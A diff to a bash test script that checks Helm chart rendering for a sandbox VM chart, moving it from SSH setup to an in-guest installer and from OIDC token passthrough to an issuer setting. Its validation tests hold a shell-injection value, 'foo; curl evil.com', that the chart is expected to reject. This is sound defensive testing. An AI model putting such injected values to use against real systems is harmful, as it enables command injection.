@@ -1,5 +1,6 @@
 #!/usr/bin/env bash
-# Offline validation: verify all OIDC-related chart templates render correctly.
+# Offline validation: verify the Keycloak, pattern-secrets and sandbox chart
+# templates render correctly (the sandbox chart in depth: tests/charts).
 # Requires: helm.
 set -euo pipefail
 
@@ -103,27 +104,22 @@ assert_contains "${PS_OUTPUT}" "vault-backend" "vault backend referenced"
 
 # ============================================================
 echo ""
-echo "=== Sandbox Chart (no OIDC) ==="
+echo "=== Sandbox Chart (in-guest installer, no OIDC) ==="
 # ============================================================
 
 SB_DEFAULT="$(helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
   --set sandboxName=my-sandbox \
-  --set sshPublicKey="${SSH_KEY}" \
-  --set inference.provider=gemini \
-  --set inference.model=flash \
-  --set inference.apiKey=test-key 2>&1)"
+  --set inference.provider=build \
+  --set inference.model=nvidia/nemotron-3-super-120b-a12b 2>&1)"
 run_test "renders without OIDC" \
-  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
-    --set sandboxName=my-sandbox \
-    --set sshPublicKey="${SSH_KEY}" \
-    --set inference.provider=gemini \
-    --set inference.model=flash \
-    --set inference.apiKey=test-key
+  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" --set sandboxName=my-sandbox
 
-assert_not_contains "${SB_DEFAULT}" "OIDC_TOKEN=ey" "no OIDC token value in setup-env secret"
-assert_contains "${SB_DEFAULT}" "NEMOCLAW_PROVIDER=gemini" "provider set in env"
-assert_contains "${SB_DEFAULT}" "NEMOCLAW_MODEL=flash" "model set in env"
-assert_contains "${SB_DEFAULT}" "NEMOCLAW_API_KEY=test-key" "API key set in env"
+assert_contains "${SB_DEFAULT}" "name: my-sandbox-installer" "installer ConfigMap rendered"
+assert_contains "${SB_DEFAULT}" "apply_bom.py" "in-guest installer shipped on the installer disk"
+assert_contains "${SB_DEFAULT}" "secretName: inference" "inference Secret attached to the VM"
+assert_contains "${SB_DEFAULT}" "name: saw-bom-profiles" "SAW-BOM profiles attached to the VM"
+assert_not_contains "${SB_DEFAULT}" "name: my-sandbox-setup" "no SSH-based setup Job"
+assert_not_contains "${SB_DEFAULT}" "OIDC_TOKEN" "no OIDC token anywhere in the rendered chart"
 
 # ============================================================
 echo ""
@@ -132,120 +128,54 @@ echo "=== Sandbox Chart (with OIDC) ==="
 
 SB_OIDC="$(helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
   --set sandboxName=my-sandbox \
-  --set sshPublicKey="${SSH_KEY}" \
-  --set inference.provider=gemini \
-  --set inference.model=flash \
-  --set inference.apiKey=test-key \
-  --set-string oidc.token=eyJhbGciOiJSUzI1NiJ9.test 2>&1)"
-run_test "renders with OIDC token" \
+  --set oidc.issuerUrl=https://kc.example.com/realms/openshell \
+  --set-string accessControl.ownerSubject=f3c1-owner 2>&1)"
+run_test "renders with OIDC issuer" \
   helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
     --set sandboxName=my-sandbox \
-    --set sshPublicKey="${SSH_KEY}" \
-    --set inference.provider=gemini \
-    --set inference.model=flash \
-    --set inference.apiKey=test-key \
-    --set-string oidc.token=eyJhbGciOiJSUzI1NiJ9.test
+    --set oidc.issuerUrl=https://kc.example.com/realms/openshell
 
-assert_contains "${SB_OIDC}" "OIDC_TOKEN=eyJhbGciOiJSUzI1NiJ9.test" "OIDC token in setup env"
-assert_contains "${SB_OIDC}" "OIDC_PASSTHROUGH=true" "OIDC passthrough enabled"
-assert_contains "${SB_OIDC}" 'export OIDC_TOKEN' "OIDC token exported in run-create.sh"
-assert_contains "${SB_OIDC}" "/sandbox/.oidc/token.json" "OIDC token written to sandbox"
-assert_contains "${SB_OIDC}" "oidc_token.json" "OIDC token written to CLI token store"
-assert_contains "${SB_OIDC}" 'access_token' "OIDC token file contains access_token JSON key"
-assert_contains "${SB_OIDC}" 'OIDC_ISSUER' "OIDC issuer exported"
-assert_contains "${SB_OIDC}" 'OIDC_CLIENT_ID' "OIDC client_id exported"
+assert_contains "${SB_OIDC}" "https://kc.example.com/realms/openshell" "gateway configured with the OIDC issuer"
+assert_contains "${SB_OIDC}" "f3c1-owner" "owner subject passed to the installer"
+assert_not_contains "${SB_OIDC}" "eyJ" "no token value in the rendered chart (users log in themselves)"
 
 # ============================================================
 echo ""
-echo "=== Sandbox Chart (with ESO provider secret) ==="
+echo "=== Sandbox Chart (provider Secrets) ==="
 # ============================================================
 
-SB_ESO="$(helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
+SB_SECRETS="$(helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
   --set sandboxName=my-sandbox \
-  --set sshPublicKey="${SSH_KEY}" \
-  --set inference.provider=gemini \
-  --set inference.model=flash \
-  --set inference.secretName=gemini 2>&1)"
-run_test "renders with ESO provider secret" \
-  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
-    --set sandboxName=my-sandbox \
-    --set sshPublicKey="${SSH_KEY}" \
-    --set inference.provider=gemini \
-    --set inference.model=flash \
-    --set inference.secretName=gemini
-
-assert_contains "${SB_ESO}" "secretName: gemini" "provider secret mounted in job"
-assert_contains "${SB_ESO}" "/provider-secret" "provider secret mount path present"
-assert_contains "${SB_ESO}" "provider-secret/api_key" "API key read from provider secret"
-
-# ============================================================
-echo ""
-echo "=== Sandbox Chart (with web search secret) ==="
-# ============================================================
-
-SB_SEARCH="$(helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
-  --set sandboxName=my-sandbox \
-  --set sshPublicKey="${SSH_KEY}" \
-  --set inference.provider=gemini \
-  --set inference.model=flash \
-  --set inference.apiKey=test-key \
-  --set inference.webSearch=tavily 2>&1)"
-run_test "renders with web search secret" \
-  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
-    --set sandboxName=my-sandbox \
-    --set sshPublicKey="${SSH_KEY}" \
-    --set inference.provider=gemini \
-    --set inference.model=flash \
-    --set inference.apiKey=test-key \
-    --set inference.webSearch=tavily
-
-assert_contains "${SB_SEARCH}" "secretName: web-search" "web-search secret mounted in job"
-assert_contains "${SB_SEARCH}" "/search-secret" "search secret mount path present"
-assert_contains "${SB_SEARCH}" "search-secret/provider" "search provider read from secret"
-
-# web-search secret always mounted (optional: true)
-SB_NO_SEARCH="$(helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
-  --set sandboxName=my-sandbox \
-  --set sshPublicKey="${SSH_KEY}" \
-  --set inference.provider=gemini \
-  --set inference.model=flash \
-  --set inference.apiKey=test-key 2>&1)"
-assert_contains "${SB_NO_SEARCH}" "name: search-secret" "web-search secret always mounted (optional)"
+  --set inference.secretName=gemini \
+  --set 'additionalProviderSecrets[0]=web-search' 2>&1)"
+assert_contains "${SB_SECRETS}" "secretName: gemini" "provider Secret attached as a VM disk"
+assert_contains "${SB_SECRETS}" "secretName: web-search" "additional provider Secret attached"
+assert_contains "${SB_SECRETS}" "optional: true" "provider Secret disks are optional"
 
 # ============================================================
 echo ""
 echo "=== Secret Name Validation ==="
 # ============================================================
 
-run_test "accepts valid sshSecret name" \
-  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
-    --set sandboxName=my-sandbox \
-    --set sshPublicKey="${SSH_KEY}" \
-    --set sshSecret=openshell-aap-ssh
-
 run_test "accepts valid inference secretName" \
   helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
     --set sandboxName=my-sandbox \
-    --set sshPublicKey="${SSH_KEY}" \
     --set inference.secretName=my-inference-secret
 
-run_test_should_fail "rejects sshSecret with shell injection" \
+run_test_should_fail "rejects inference secretName with shell injection" \
   helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
     --set sandboxName=my-sandbox \
-    --set sshPublicKey="${SSH_KEY}" \
-    --set 'sshSecret=foo; curl evil.com'
+    --set 'inference.secretName=foo; curl evil.com'
 
 run_test_should_fail "rejects inference secretName with spaces" \
   helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
     --set sandboxName=my-sandbox \
-    --set sshPublicKey="${SSH_KEY}" \
     --set 'inference.secretName=bad name'
 
-run_test_should_fail "rejects sshSecret starting with dash" \
+run_test_should_fail "rejects inference secretName starting with dash" \
   helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
     --set sandboxName=my-sandbox \
-    --set sshPublicKey="${SSH_KEY}" \
-    --set sshSecret=-invalid
+    --set inference.secretName=-invalid
 
 run_test_should_fail "rejects explicit sandboxName longer than 19 characters" \
   helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
